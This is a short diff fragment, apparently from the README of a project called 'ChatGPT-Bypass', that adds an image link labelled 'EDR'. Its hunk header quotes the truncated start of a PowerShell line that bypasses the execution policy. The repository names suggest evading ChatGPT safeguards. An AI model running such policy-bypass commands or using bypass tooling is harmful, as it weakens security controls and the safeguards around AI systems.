@@ -79,4 +79,5 @@ PS C:\Windows\system32> Set-ExecutionPolicy Bypass -Scope Process -Force; [Syste
 
 
 ![funnychat.png](https://github.com/JimSolomon/ChatGPT-Bypass/blob/main/2023-04-02_12-18.png)
+![EDR](https://github.com/JimSolomon/ChatGPT-Bypass-Discord-bot/blob/main/EDR.png)
 
